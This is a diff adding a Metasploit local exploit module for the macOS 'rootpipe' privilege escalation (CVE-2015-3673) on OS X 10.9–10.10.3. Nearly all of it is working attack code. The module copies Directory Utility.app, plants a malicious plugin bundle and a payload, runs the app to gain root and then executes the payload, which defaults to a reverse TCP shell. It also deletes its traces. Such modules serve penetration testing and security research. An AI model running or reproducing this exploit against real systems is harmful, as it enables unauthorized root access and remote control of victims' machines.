@@ -1,0 +1,161 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Local
+
+  Rank = GreatRanking
+
+  include Msf::Post::OSX::System
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apple OS X Entitlements Rootpipe Privilege Escalation',
+      'Description'    => %q{
+        This module exploits the rootpipe vulnerability and bypasses Apple's initial
+        fix for the issue by injecting code into a process with the 'admin.writeconfig'
+        entitlement.
+      },
+      'Author'         => [
+        'Emil Kvarnhammar', # Vulnerability discovery and PoC
+        'joev'              # Copy/paste monkey
+      ],
+      'References'     => [
+        ['CVE',   '2015-3673'],
+        ['URL',   'https://truesecdev.wordpress.com/2015/07/01/exploiting-rootpipe-again/']
+      ],
+      'DisclosureDate' => 'Jul 1 2015',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'osx',
+      'Arch'           => ARCH_X86_64,
+      'SessionTypes'   => ['shell'],
+      'Privileged'     => true,
+      'Targets'        => [
+        ['Mac OS X 10.9-10.10.3', {}]
+      ],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {
+        'PAYLOAD'         => 'osx/x64/shell_reverse_tcp',
+        'PrependSetreuid' => true
+      }
+    ))
+
+    register_options([
+      OptString.new('WRITABLEDIR', [true, 'Writable directory', '/.Trashes'])
+    ])
+  end
+
+  def check
+    if ver? && admin?
+      vprint_status("Version is between 10.9 and 10.10.3, and is admin.")
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    print_status("Copying Directory Utility.app to #{new_app}")
+    cmd_exec("cp -R '/System/Library/CoreServices/Applications/Directory Utility.app' '#{new_app}'")
+    cmd_exec("mkdir -p '#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/MacOS'")
+
+    print_status("Writing bundle plist to `#{plist_file}'")
+    write_file(plist_file, plist)
+
+    print_status("Writing payload to `#{payload_file}'")
+    write_file(payload_file, binary_payload)
+    register_file_for_cleanup(payload_file)
+
+    print_status("Writing malicious shared library to `#{exploit_file}'")
+    write_file(exploit_file, plugin_exploit)
+
+    print_status("Running Directory Utility.app")
+    cmd_exec("/bin/sh -c 'PAYLOAD_IN="+payload_file+" PAYLOAD_OUT="+root_file+" #{new_app}/Contents/MacOS/Directory\\ Utility'")
+
+    print_status("Deleting Directory Utility.app")
+    cmd_exec('rm -Rf "#{new_app}"')
+
+    print_status('Executing payload...')
+    cmd_exec("/bin/sh -c '#{root_file} &'")
+  end
+
+  def ver?
+    Gem::Version.new(get_sysinfo['ProductVersion']).between?(
+      Gem::Version.new('10.9'), Gem::Version.new('10.10.3')
+    )
+  end
+
+  def admin?
+    cmd_exec('groups | grep -wq admin && echo true') == 'true'
+  end
+
+  def sploit
+    "#{datastore['PYTHON']} #{exploit_file} #{payload_file} #{payload_file}"
+  end
+
+  def plugin_exploit
+    File.read(File.join(
+      Msf::Config.data_directory, 'exploits', 'CVE-2015-3673', 'exploit.daplug'
+    ))
+  end
+
+  def binary_payload
+    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
+  end
+
+  def exploit_file
+    "#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/MacOS/RootpipeBundle"
+  end
+
+  def plist_file
+    "#{new_app}/Contents/PlugIns/RootpipeBundle.daplug/Contents/Info.plist"
+  end
+
+  def new_app
+    @app ||= "#{datastore['WRITABLEDIR']}/#{Rex::Text.rand_text_alpha(8)}.app"
+  end
+
+  def plist
+    %Q|
+      <?xml version="1.0" encoding="UTF-8"?>
+      <plist version="1.0">
+      <dict>
+        <key>CFBundleGetInfoString</key>
+        <string>RootpipeBundle</string>
+        <key>CFBundleExecutable</key>
+        <string>RootpipeBundle</string>
+        <key>CFBundleIdentifier</key>
+        <string>com.root.pipe</string>
+        <key>CFBundleName</key>
+        <string>RootpipeBundle</string>
+        <key>CFBundleShortVersionString</key>
+        <string>0.01</string>
+        <key>CFBundleInfoDictionaryVersion</key>
+        <string>6.0</string>
+        <key>CFBundlePackageType</key>
+        <string>APPL</string>
+        <key>IFMajorVersion</key>
+        <integer>0</integer>
+        <key>IFMinorVersion</key>
+        <integer>1</integer>
+      </dict>
+      </plist>
+    |
+  end
+
+  def payload_file
+    @payload_file ||=
+      "#{datastore['WRITABLEDIR']}/#{Rex::Text.rand_text_alpha(8)}"
+  end
+
+  def root_file
+    @root_file ||=
+      "#{datastore['WRITABLEDIR']}/#{Rex::Text.rand_text_alpha(8)}"
+  end
+
+end
